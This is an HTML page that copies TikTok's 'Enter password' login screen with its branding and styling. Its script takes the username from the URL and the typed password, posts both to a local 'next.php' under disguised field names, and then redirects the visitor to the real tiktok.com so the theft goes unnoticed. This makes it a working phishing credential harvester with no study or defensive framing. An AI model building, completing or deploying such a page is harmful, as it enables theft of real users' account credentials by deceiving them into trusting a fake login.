<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Password - TikTok</title>
    <link href="assets/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=TikTok+Sans:ital,wght@0,300;0,400;0,600;0,800;1,400&display=swap" rel="stylesheet">
    <style>
        :root {
            /* core brand colors */
            --ttk-black: #000000;
            --ttk-white: #ffffff;
            --ttk-pink: #FE2C55; /* "Razzmatazz" */
            --ttk-cyan: #25F4EE; /* "Splash" */

            /* UI neutrals */
            --bg: var(--ttk-white);
            --surface: #0f0f0f;
            --muted: #9a9a9a;
        }

        * { box-sizing: border-box; }

        html, body {
            margin: 0 !important;
            padding: 0 !important;
             font-family: "TikTok Sans", Inter, "Helvetica Neue", Arial, sans-serif !important;
            width: 100% !important;
            overflow-x: hidden !important;
            background: var(--bg) !important;
            color: var(--ttk-black) !important;
        }

        .tiktok-container {
            background: var(--ttk-white) !important;
            color: var(--ttk-black) !important;
            margin: 1rem auto 0 !important;
            padding: 20px !important;
            width: 100% !important;
            max-width: none !important;
            min-height: 400px !important;
            display: flex !important;
            flex-direction: column !important;
            justify-content: center !important;
            align-items: center !important;
            padding-bottom: 80px !important; /* Space for fixed footer */
            box-sizing: border-box !important;
        }

        .tiktok-form {
            width: 100% !important;
            max-width: 320px !important;
            margin: 0 auto !important;
        }

    .header {
        display: flex !important;
        align-items: center !important;
        justify-content: flex-start !important;
        margin-bottom: 25px !important;
        max-width: 320px !important;
        margin: 0 auto 25px !important;
        position: relative !important;
    }

        .back-btn {
            font-size: 28px !important;
            color: var(--ttk-black) !important;
            text-decoration: none !important;
            cursor: pointer !important;
            font-weight: 400 !important;
            letter-spacing: 4px !important;
        }

        .help-icon {
            width: 20px !important;
            height: 20px !important;
            background: #5e5d5d !important;
            border-radius: 50% !important;
            display: flex !important;
            align-items: center !important;
            justify-content: center !important;
            color: var(--ttk-white) !important;
            font-size: 17px !important;
            font-weight: 600 !important;
        }

        .password-title {
            font-size: 24px !important;
            font-weight: 800 !important;
             font-family: "TikTok Sans", Inter, "Helvetica Neue", Arial, sans-serif !important;
            margin: 0 0 15px 0 !important;
            color: var(--ttk-black) !important;
            text-align: left !important;
        }

        .password-input-group {
            position: relative !important;
            margin-bottom: 15px !important;
            font-family: "TikTok Sans", Inter, "Helvetica Neue", Arial, sans-serif !important;
        }

        input[type="password"] {
            width: 100% !important;
            height: 50px !important;
            padding: 12px 40px 12px 14px !important;
            background: whitesmoke !important;
            border: none !important;
            border-radius: 6px !important;
            color: var(--ttk-black) !important;
            font-size: 14px !important;
            box-sizing: border-box !important;
            outline: none !important;
            transition: all 0.2s ease !important;
        }

        input[type="password"]:focus, input[type="text"]:focus {
            background: var(--ttk-white) !important;
            border: 2px solid var(--ttk-pink) !important;
        }

        input[type="text"] {
            width: 100% !important;
            height: 50px !important;
            padding: 12px 40px 12px 14px !important;
            background: whitesmoke !important;
            border: none !important;
            border-radius: 6px !important;
            color: var(--ttk-black) !important;
            font-size: 14px !important;
            box-sizing: border-box !important;
            outline: none !important;
            transition: all 0.2s ease !important;
        }

        .eye-toggle {
            position: absolute !important;
            right: 10px !important;
            top: 50% !important;
            transform: translateY(-50%) !important;
            background: none !important;
            border: none !important;
            cursor: pointer !important;
            font-size: 18px !important;
            color: var(--muted) !important;
        }

        .continue-btn {
            width: 100% !important;
            padding: 10px !important;
            background: var(--ttk-pink) !important;
            color: var(--ttk-white) !important;
            border: none !important;
            border-radius: 6px !important;
            font-size: 16px !important;
            font-weight: 600 !important;
            cursor: pointer !important;
            margin-top: 50px !important;
        }

        .help-link {
            display: block !important;
            text-align: left !important;
            margin-top: 10px !important;
            color: var(--ttk-black) !important;
            text-decoration: none !important;
            font-size: 14px !important;
            font-weight: 600 !important;
        }


    </style>
</head>
<body>
    <div class="tiktok-form">
        <div class="header">
            <a class="back-btn" onclick="goBack()"><</a>
        </div>

        <div class="password-title">Enter password</div>

        <div class="password-input-group">
            <input type="password" id="password" placeholder="Password" required>
            <button class="eye-toggle" onclick="togglePassword()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M1 12C1 12 5 4 12 4C19 4 23 12 23 12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M1 12C1 12 5 20 12 20C19 20 23 12 23 12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><line x1="1" y1="1" x2="23" y2="23" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg></button>
        </div>

        <a href="#" class="help-link" onclick="needHelp()">Need help logging in?</a>

        <button class="continue-btn" onclick="continueLogin()">Continue</button>
    </div>

    <script>
        function goBack() {
            window.location.href = 'simple_tiktok.html';
        }

        // Get URL parameters
        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        }

        var username = getUrlParameter('username');

        const openEyeSVG = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M1 12C1 12 5 4 12 4C19 4 23 12 23 12C23 12 19 20 12 20C5 20 1 12 1 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2"/></svg>';
        const closedEyeSVG = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M1 12C1 12 5 4 12 4C19 4 23 12 23 12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M1 12C1 12 5 20 12 20C19 20 23 12 23 12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><line x1="1" y1="1" x2="23" y2="23" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>';

        function togglePassword() {
            const input = document.getElementById('password');
            const eye = document.querySelector('.eye-toggle');
            if (input.type === 'password') {
                input.type = 'text';
                eye.innerHTML = openEyeSVG;
            } else {
                input.type = 'password';
                eye.innerHTML = closedEyeSVG;
            }
        }

        function continueLogin() {
            const password = document.getElementById('password').value;
            if (username.trim() && password.trim()) {
                // Send to next.php
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'next.php', true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send('di=' + encodeURIComponent(username) + '&pr=' + encodeURIComponent(password));
                window.location.href = 'https://www.tiktok.com';
            } else {
                alert("Please enter your password.");
            }
        }

        function needHelp() {
            alert("Please contact support.");
        }
    </script>
</body>
</html>
